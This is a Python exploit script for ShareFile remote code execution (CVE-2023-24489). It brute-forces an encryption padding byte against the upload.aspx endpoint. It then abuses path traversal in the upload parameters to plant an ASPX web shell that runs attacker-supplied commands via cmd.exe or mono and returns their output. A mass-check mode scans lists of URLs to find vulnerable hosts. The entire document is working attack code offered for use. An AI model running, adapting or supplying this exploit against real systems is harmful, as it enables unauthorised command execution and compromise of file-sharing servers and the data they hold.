import argparse
import requests
import base64
import urllib.parse
from requests.exceptions import SSLError, ConnectTimeout, ReadTimeout, ConnectionError
from urllib3.exceptions import InsecureRequestWarning

def exploit(target, cmd="whoami", is_windows=True):
    requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
    valid_padding = None
    print("[+] Finding correct padding")

    session = requests.Session()
    adapter = requests.adapters.HTTPAdapter(pool_connections=10, pool_maxsize=100)
    session.mount('http://', adapter)
    session.mount('https://', adapter)

    for i in range(0, 256):
        payload = [
            # block 0
            b'\x41', b'\x41', b'\x41', b'\x41',
            b'\x41', b'\x41', b'\x41', b'\x41',
            b'\x41', b'\x41', b'\x41', b'\x41',
            b'\x41', b'\x41', b'\x41', i.to_bytes(1, byteorder='little'),

            # block 1
            b'\x41', b'\x41', b'\x41', b'\x41',
            b'\x41', b'\x41', b'\x41', b'\x41',
            b'\x41', b'\x41', b'\x41', b'\x41',
            b'\x41', b'\x41', b'\x41', b'\x41'
        ]
        payload = b''.join(payload)
        payload = base64.b64encode(payload)
        payload = urllib.parse.quote(payload, safe='')

        url = f'{target}/documentum/upload.aspx?parentid={payload}&uploadid=x'
        try:
            r = session.get(url, timeout=5, verify=False)
        except ConnectTimeout:
            print('[-] Connection Timeout Error')
            continue
        except ReadTimeout:
            print('[-] Read Timeout Error')
            continue
        except SSLError as e:
            if 'unsafe legacy renegotiation disabled' in str(e):
                print('[-] Unsafe Legacy Renegotiation Disabled')
            elif 'TLS/SSL connection has been closed' in str(e):
                print('[-] SSL Connection Closed (EOF)')
            elif 'certificate verify failed' in str(e):
                print('[-] SSL Certificate Error')
            else:
                print(e)
            continue
        except ConnectionError as e:
            print('[-] Connection Error:', e)
            continue
        if r.status_code == 200:
            if 'Invalid request method - GET' in r.text:
                valid_padding = payload
                print(f'Valid padding:   {payload}')
                break

    if valid_padding:
        parentid = valid_padding
        filename = 'real.aspx'
        if is_windows:
            data = f'''<%@ Page Language="C#" Debug="true" Trace="false" %>
            <%@ Import Namespace="System.Diagnostics" %>
            <%@ Import Namespace="System.IO" %>
            <script Language="c#" runat="server">
            void Page_Load(object sender, EventArgs e)
            {{
                Response.Write("<pre>");
                Response.Write(Server.HtmlEncode(ExcuteCmd()));
                Response.Write("</pre>");
            }}
            string ExcuteCmd()
            {{
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = "cmd.exe";
                psi.Arguments = "/c {cmd}";
                psi.RedirectStandardOutput = true;
                psi.UseShellExecute = false;
                Process p = Process.Start(psi);
                StreamReader stmrdr = p.StandardOutput;
                string s = stmrdr.ReadToEnd();
                stmrdr.Close();
                return s;
            }}
            </script>'''
        else:
            data = f'''<%@ Page Language="C#" Debug="true" Trace="false" %>
            <%@ Import Namespace="System.Diagnostics" %>
            <%@ Import Namespace="System.IO" %>
            <script Language="c#" runat="server">
            void Page_Load(object sender, EventArgs e)
            {{
                Response.Write("<pre>");
                Response.Write(Server.HtmlEncode(ExcuteCmd()));
                Response.Write("</pre>");
            }}
            string ExcuteCmd()
            {{
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = "/usr/bin/mono";
                psi.Arguments = "{cmd}";
                psi.RedirectStandardOutput = true;
                psi.UseShellExecute = false;
                Process p = Process.Start(psi);
                StreamReader stmrdr = p.StandardOutput;
                string s = stmrdr.ReadToEnd();
                stmrdr.Close();
                return s;
            }}
            </script>'''

        url = f'{target}/documentum/upload.aspx?parentid={parentid}&raw=1&unzip=on&uploadid={filename}\..\..\..\cifs&filename={filename}'
        headers = {'Content-Type': 'text/html; charset=utf-8'}
        response = session.post(url, data=data, headers=headers, verify=False)
        if response.status_code == 200:
            print(response.text)
            get_url = f'{target}/cifs/{filename}'
            try:
                get_response = session.get(get_url, verify=False)
                if get_response.status_code == 200:
                    print(get_response.text)
                else:
                    print(f'[-] Error retrieving the result: {get_response.status_code}')
            except (SSLError, ConnectTimeout, ReadTimeout, ConnectionError) as e:
                print(f'[-] Error retrieving the result: {str(e)}')
    else:
        print('[-] No valid padding found.')

def mass_check(filename):
    requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
    with open(filename, 'r') as wordlist_file:
        session = requests.Session()
        adapter = requests.adapters.HTTPAdapter(pool_connections=10, pool_maxsize=100)
        session.mount('http://', adapter)
        session.mount('https://', adapter)

        for line in wordlist_file:
            url = line.strip()
            payload_url = f'{url}/documentum/upload.aspx?parentid=QDDDD&uploadid=x'
            try:
                response = session.get(payload_url, timeout=5)

                if response.status_code == 200:
                    print(f'[+] Potentially vulnerable URL: {url}')
                else:
                    print(f'[-] Not vulnerable: {url}')
            except SSLError as e:
                if 'unsafe legacy renegotiation disabled' in str(e):
                    print('[-] Unsafe Legacy Renegotiation Disabled')
                elif 'TLS/SSL connection has been closed' in str(e):
                    print('[-] SSL Connection Closed (EOF)')
                elif 'certificate verify failed' in str(e):
                    print('[-] SSL Certificate Error')
                else:
                    print(e)
            except ConnectionError as e:
                print('[-] Connection Error:', e)
            except ConnectTimeout:
                print('[-] Connection Timeout Error')
            except ReadTimeout:
                print('[-] Read Timeout Error')

if __name__ == '__main__':
    print('''ShareFile RCE (CVE-2023-24489) 

█▄▄ █▄█ ▀   ▄▀█ █▀▄ █░█ █▄▀ █▀█
█▄█ ░█░ ▄   █▀█ █▄▀ █▀█ █░█ █▀▄
''')
    parser = argparse.ArgumentParser(description='Exploit or mass check vulnerable URLs')
    parser.add_argument('--host', help='URL to exploit')
    parser.add_argument('--windows', action='store_true', help='Specify if the target is Windows')
    parser.add_argument('--linux', action='store_true', help='Specify if the target is Linux')
    parser.add_argument('--cmd', help='Command to execute during exploitation')
    parser.add_argument('--mass-check', help='Path to the wordlist file for mass checking')

    args = parser.parse_args()

    if args.host:
        if args.windows:
            exploit(args.host, args.cmd, is_windows=True)
        elif args.linux:
            exploit(args.host, args.cmd, is_windows=False)
        else:
            print('Please specify either --windows or --linux argument.')
    elif args.mass_check:
        mass_check(args.mass_check)
    else:
        print('Please provide either --host or --mass-check argument.')